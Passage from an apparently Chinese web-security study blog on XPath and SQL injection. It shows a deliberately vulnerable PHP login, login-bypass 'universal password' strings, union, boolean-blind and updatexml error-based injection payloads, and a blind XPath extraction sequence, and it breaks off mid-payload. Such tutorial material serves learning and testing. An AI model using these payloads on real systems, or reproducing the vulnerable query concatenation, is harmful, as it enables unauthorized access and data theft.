class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;test.xml&#x27;</span>);<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];<br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;ID:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;id;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;Username:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;username;<br>    &#125;<br>&#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>simplexml_load_file</code>，加载xml文件</p><p>正常查询：<code>?name=test1&amp;pwd=test1</code></p><p>server端语句：<code>/root/users/user[username/text()='test1'and password/text()='test1']</code></p><p>注入语句：<code>?name=' or 1=1 or ''='&amp;pwd=1</code></p><p>server语句：<code>/root/users/user[username/text()='' or 1=1 or ''='' and password/text()='1']</code></p><h3 id="注入payload">注入payload</h3><h4 id="一般注入形式">一般注入形式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//原php代码中的查询语句</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload1：user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload2：&#x27;]|//*|//*[&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27;]|//*|//*[&#x27;&#x27;]&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="盲注">盲注</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs PHP">链：/ -&gt; root -&gt; user/user -&gt; username/email/password<br>判断根节点下的节点数<br><span class="hljs-string">&#x27;or count(/)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点数量为1</span><br><span class="hljs-string">&#x27;or count(/*)=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点下只有一个子节点</span><br>判断根节点下节点长度<br><span class="hljs-string">&#x27;or string-length(name(/*[1]))=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>      <span class="hljs-comment">//判断根节点下的节点长度为1</span><br>判断根节点下节点名称<br><span class="hljs-string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span>r<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜根节点下的节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>o<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设根节点下子节点名称为root，判断子节点下的的节点<br><span class="hljs-string">&#x27;or count(/root)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>                  <span class="hljs-comment">//root节点数量为1</span><br><span class="hljs-string">&#x27;or count(/root/user/*)&gt;1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>            <span class="hljs-comment">//root下有两个或以上节点</span><br><span class="hljs-string">&#x27;or string-length(name(/root/*[1]))=4  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//判断第一个子节点长度为4</span><br>猜解root下的节点名称：<br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//猜root节点下的第一个节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设root下节点名称为user<br><span class="hljs-string">&#x27;or count(/root/user)=2  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <span class="hljs-comment">//user节点有两个，则可以猜测出root节点结构，root下两个节点，均为user节点</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>判断user节点的子节点长度<br><span class="hljs-string">&#x27;or string-length(name(/root/user[position()=1]/*[1]))=8 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//user下第一个子节点长名称度为8</span><br>判断user节点的下子节点名称<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜user节点下的第一个节点名称</span><br>...<br>最终所有子节点值验证如下：<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1)=&#x27;</span>username<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[2]), 1)=&#x27;</span>email<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[3]), 1)=&#x27;</span>password<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>猜有无子节点<br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/email/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/accounttype/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/password/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-literal">false</span>则没有节点<br>读最后节点长度<br><span class="hljs-string">&#x27;or string-length((//user[position()=1]/username[position()=1]))=6 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-comment">//第一个user下username长度</span><br>读值<br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>f<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),2,1)=&#x27;</span>l<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),3,1)=&#x27;</span>a<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),4,1)=&#x27;</span>g<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br></code></pre></td></tr></table></figure><p>更多参考</p><p><ahref="https://jiang-niao.github.io/2020/04/24/从ctf题目中学习xpath注入/#CTF题目">xpath盲注脚本</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/01/01/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/01/01/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入">sql注入</h1><h2 id="数据库知识">数据库知识</h2><p>数据库结构：</p><p>mysql</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">库-表-字段（数据）<br><span class="hljs-function"><span class="hljs-title">database</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">table</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">column</span>-&gt;</span>value<br></code></pre></td></tr></table></figure><p>常用sql语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">数据库创建</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show databases;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create table student(<span class="hljs-built_in">id</span> int(10),username varchar(20),mail varchar(20));</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show tables;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">插入数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(1,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;zs@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(2,<span class="hljs-string">&quot;lisi&quot;</span>,<span class="hljs-string">&quot;ls@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> mail from student;</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">update student <span class="hljs-built_in">set</span> username=<span class="hljs-string">&quot;zhangsan2&quot;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1 ;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">delete from student <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop table student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询登录的用户</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> user();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据存放地址</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> @@datadir;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库的版本</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> version();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">where</span>条件,<span class="hljs-built_in">limit</span>条件</span><br>where 字段名=x 返回对应字段名为x的那一行<br>limit x,x 查询的数据 只返回第(x-1)行开始的内容 返回x行<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-built_in">limit</span> 0,1;</span><br></code></pre></td></tr></table></figure><p>PHP连接数据库语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span>);  <span class="hljs-comment">//打开非持久的 MySQL 连接</span><br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;school&quot;</span>);   <span class="hljs-comment">//选择school数据库</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from student&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);  <span class="hljs-comment">//执行sql语句</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;  <span class="hljs-comment">//取一行结果为数组（有keyvalue），没有行返回false</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; username:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot; mail:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;mail&quot;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="sql注入-1">sql注入</h2><p>原理</p><p>闭合符号如<code>'</code>、<code>"</code>、<code>')</code>，达到执行其他语句的效果</p><p>万能密码</p><p>sql语句：</p><p><code>SELECT * FROM users WHERE username= '".$username."' AND Password= '".md5($password)."'</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27; or 1=&#x27;</span>1<br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br><span class="hljs-string">&quot;or &quot;</span>a<span class="hljs-string">&quot;=&quot;</span>a<br>a<span class="hljs-string">&#x27; having 1=1#</span><br><span class="hljs-string">a&#x27;</span> having <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>admin<span class="hljs-string">&#x27; OR 4=4/*</span><br><span class="hljs-string">&#x27;</span>)<span class="hljs-keyword">or</span>(<span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;a</span><br><span class="hljs-string">or 4=4--</span><br><span class="hljs-string">&quot;or 4=4--</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4/*<br><span class="hljs-string">&#x27;or&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-string">&quot;or&quot;</span>=<span class="hljs-string">&quot;a&#x27;=&#x27;a</span><br><span class="hljs-string">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="hljs-string">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="hljs-string">&#x27;OR 4=4%00</span><br><span class="hljs-string">&quot;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4%00<br>1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>=1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4<br>admin<span class="hljs-string">&#x27; UNION Select 1,1,1 FROM admin Where &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>-1%cf<span class="hljs-string">&#x27; union select 1,1,1 as password,1,1,1 %23</span><br></code></pre></td></tr></table></figure><h3 id="union注入">union注入</h3><p>union的使用：sql语句1 union sql语句2如果字段数相同的话会同时返回，且sql语句1出错时只返回sql语句2</p><p>注入流程：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gauss">判断注入点：<br><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span>……<span class="hljs-meta">#</span><br><br>获取字段数量，查看回显位置<br><span class="hljs-number">-1</span>&#x27; order by <span class="hljs-number">4</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>查询库<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br><br>查询库中表名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,table_name from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-built_in">database</span>() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查询字段名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;users&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查数据<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,id from sqli.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h3 id="布尔盲注">布尔盲注</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())&gt;=<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(select database())&gt;=1--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">80</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="报错注入">报错注入</h3><h4 id="updatexml">updatexml</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0x3a</span>、<span class="hljs-number">0x7e</span>是为了在xpath中是语法错误的<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span 